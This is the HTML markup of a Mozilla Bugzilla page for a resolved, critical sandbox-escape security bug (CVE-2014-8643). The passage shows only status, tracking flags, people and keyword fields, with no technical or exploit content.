    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla37

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox34</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox34&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox35</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox36</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox36&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox37</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox37&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr31</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr31&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">b2g-v1.4</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_b2g_1_4&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">b2g-v2.0</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_b2g_2_0&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">b2g-v2.0M</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_b2g_2_0m&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">b2g-v2.1</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_b2g_2_1&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">b2g-v2.2</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_b2g_2_2&amp;o1=equals&amp;v1=unaffected">unaffected</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox34</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox34-dirty">
  <select id="cf_status_firefox34" name="cf_status_firefox34">
        <option value="wontfix"
          id="v1785_cf_status_firefox34" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox35</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox35-dirty">
  <select id="cf_status_firefox35" name="cf_status_firefox35">
        <option value="fixed"
          id="v1847_cf_status_firefox35" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox36</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox36-dirty">
  <select id="cf_status_firefox36" name="cf_status_firefox36">
        <option value="fixed"
          id="v1954_cf_status_firefox36" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox37</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox37-dirty">
  <select id="cf_status_firefox37" name="cf_status_firefox37">
        <option value="fixed"
          id="v1990_cf_status_firefox37" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr31</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr31-dirty">
  <select id="cf_status_firefox_esr31" name="cf_status_firefox_esr31">
        <option value="unaffected"
          id="v1764_cf_status_firefox_esr31" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">b2g-v1.4</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_b2g_1_4-dirty">
  <select id="cf_status_b2g_1_4" name="cf_status_b2g_1_4">
        <option value="unaffected"
          id="v1464_cf_status_b2g_1_4" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">b2g-v2.0</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_b2g_2_0-dirty">
  <select id="cf_status_b2g_2_0" name="cf_status_b2g_2_0">
        <option value="unaffected"
          id="v1601_cf_status_b2g_2_0" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">b2g-v2.0M</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_b2g_2_0m-dirty">
  <select id="cf_status_b2g_2_0m" name="cf_status_b2g_2_0m">
        <option value="unaffected"
          id="v1912_cf_status_b2g_2_0m" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">b2g-v2.1</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_b2g_2_1-dirty">
  <select id="cf_status_b2g_2_1" name="cf_status_b2g_2_1">
        <option value="unaffected"
          id="v1735_cf_status_b2g_2_1" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">b2g-v2.2</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_b2g_2_2-dirty">
  <select id="cf_status_b2g_2_2" name="cf_status_b2g_2_2">
        <option value="unaffected"
          id="v1876_cf_status_b2g_2_2" selected
        >unaffected
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: nils, Assigned: jimm)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_279663" ><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=279663" > <span class="fna">jimm</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_344130" ><img src="https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=344130" > <span class="fna">nils</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_462836" ><img src="https://secure.gravatar.com/avatar/0e698ba5145076e93cadb50d6e22edcf?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=462836" > <span class="fna">jld</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="18">18 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list edit-show" id="field-dependson" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
        ---
        </span>
    </div>

  
</div><div class="field bug-list" id="field-blocked"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Chromium's base::OpenProcess checks for the wrong return result"
   href="/show_bug.cgi?id=1119874">1119874</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - IPC child process startup leaks parent process handles into the sandbox"
   href="/show_bug.cgi?id=1119878">1119878</a>
      </div>

        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1117140&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1117140">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_file_loc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-see_also" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
        ---
        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-priv-escalation, csectype-sandbox-escape, sec-critical, Whiteboard: [adv-main35+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2014-8643

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          <a href="/buglist.cgi?keywords=csectype-sandbox-escape&amp;resolution=---">csectype-sandbox-escape</a>, 
          <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[adv-main35+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_flags"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_280903" ><a class="email " href="/user_profile?user_id=280903" > <span class="fna">abillings</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a877901_280903"
            class="rel-time-title activity-ref"
            title="7 years ago"
        data-time="1420764737"
      >sec-bounty</a>
    </td>

    <td class="flag-value">+
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_280903" ><a class="email " href="/user_profile?user_id=280903" > <span class="fna">abillings</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag-1069786">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1069786-dirty">
      <select id="flag-1069786" name="flag-1069786"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
            <option value="+" selected>+</option>
      </select>
    </td>


  </tr>
          </tbody>
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_578488" ><a class="email " href="/user_profile?user_id=578488" > <span class="fna">tjr</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a170150566_578488"
            class="rel-time-title activity-ref"
            title="1 year ago"
        data-time="1590370495"
      >sec-bounty-hof</a>
    </td>

    <td class="flag-value">+
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_578488" ><a class="email " href="/user_profile?user_id=578488" > <span class="fna">tjr</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag-1975090">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1975090-dirty">
      <select id="flag-1975090" name="flag-1975090"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
            <option value="+" selected>+</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
